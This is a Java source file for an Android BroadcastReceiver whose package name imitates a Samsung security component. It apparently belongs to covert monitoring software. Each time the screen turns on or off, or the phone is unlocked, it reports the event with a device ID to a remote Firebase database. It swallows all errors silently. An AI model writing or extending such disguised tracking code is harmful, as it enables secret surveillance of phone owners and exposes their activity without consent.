package com.samsung.android.security.v8.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.google.firebase.database.FirebaseDatabase;
import com.samsung.android.security.v8.utils.DeviceUtil;

public class ScreenReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        String deviceId = DeviceUtil.getDeviceId(context);
        
        try {
            if (Intent.ACTION_SCREEN_ON.equals(action)) {
                // Screen turned on
                updateScreenStatus(deviceId, "on");
                
            } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                // Screen turned off
                updateScreenStatus(deviceId, "off");
                
            } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
                // Device unlocked
                updateScreenStatus(deviceId, "unlocked");
            }
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private void updateScreenStatus(String deviceId, String status) {
        try {
            FirebaseDatabase.getInstance()
                    .getReference("devices")
                    .child(deviceId)
                    .child("screenStatus")
                    .setValue(status);
        } catch (Exception e) {
            // Ignore
        }
    }
}
